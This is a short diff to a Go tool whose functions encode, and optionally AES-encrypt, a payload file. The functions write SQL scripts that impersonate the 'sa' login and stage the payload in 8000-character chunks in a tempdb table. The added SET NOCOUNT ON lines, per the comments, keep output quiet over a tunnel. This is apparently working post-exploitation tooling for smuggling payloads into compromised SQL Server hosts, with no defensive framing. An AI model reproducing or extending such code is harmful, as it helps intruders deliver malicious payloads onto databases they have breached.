@@ -15,7 +15,9 @@ const chunkSize = 8000 // NVARCHAR(MAX) safe per INSERT row
 
 // StagePayload reads the payload at payloadPath, optionally AES-256-CBC encrypts it
 // (IV prepended), base64 encodes the result, then writes a SQL script to outPath
-// that creates tempdb..stg and INSERTs 8000-char base64 chunks.
+// that creates tempdb..stg and INSERTs 8000-char base64 chunks (SET NOCOUNT ON
+// keeps the hundreds of per-INSERT "(1 row affected)" messages out of the
+// sqlcmd output streamed back through the tunnel).
 // Returns the base64-encoded AES key when encrypt=true, "" otherwise.
 func StagePayload(payloadPath, outPath string, encrypt bool) (key string, err error) {
 	data, err := os.ReadFile(payloadPath)
@@ -53,6 +55,7 @@ func StagePayload(payloadPath, outPath string, encrypt bool) (key string, err er
 
 	var sb strings.Builder
 	sb.WriteString("EXECUTE AS LOGIN='sa';\n")
+	sb.WriteString("SET NOCOUNT ON;\n")
 	sb.WriteString("USE tempdb;\n")
 	sb.WriteString("IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;\n")
 	sb.WriteString("CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
@@ -72,7 +75,8 @@ func StagePayload(payloadPath, outPath string, encrypt bool) (key string, err er
 }
 
 // StagePayloadHex reads the payload, hex-encodes it (no encryption), and writes
-// a SQL script to outPath that INSERTs 8000-char hex chunks into tempdb..stg.
+// a SQL script to outPath that INSERTs 8000-char hex chunks into tempdb..stg
+// (SET NOCOUNT ON - same rationale as StagePayload).
 func StagePayloadHex(payloadPath, outPath string) error {
 	data, err := os.ReadFile(payloadPath)
 	if err != nil {
@@ -83,6 +87,7 @@ func StagePayloadHex(payloadPath, outPath string) error {
 
 	var sb strings.Builder
 	sb.WriteString("EXECUTE AS LOGIN='sa';\n")
+	sb.WriteString("SET NOCOUNT ON;\n")
 	sb.WriteString("USE tempdb;\n")
 	sb.WriteString("IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;\n")
 	sb.WriteString("CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
